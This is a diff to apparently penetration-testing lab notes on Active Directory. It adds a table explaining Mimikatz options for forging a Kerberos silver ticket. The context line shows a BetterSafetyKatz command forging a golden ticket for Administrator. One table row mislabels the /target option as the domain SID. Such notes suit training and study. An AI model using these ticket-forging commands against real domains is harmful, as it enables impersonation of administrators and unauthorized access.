@@ -71,6 +71,14 @@ $ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain
 ## **Silver Ticket**
 
 
+|  Options    |      |
+|:-----|:-----|
+|  kerberos::golden    |   Name of the module (there is no silver module!)  |
+| /User:Administrator  |   Username for which the TGT is generated   |
+| /domain:dollarcorp.moneycorp.local   |  Domain FQDN    |
+| /sid:S-1-5-21-719815819-3726368948-3917688648|   SID of the domain   |
+| /target:dcorp-dc.dollarcorp.moneycorp.local  |   SID of the domain   |
+
 
 
 
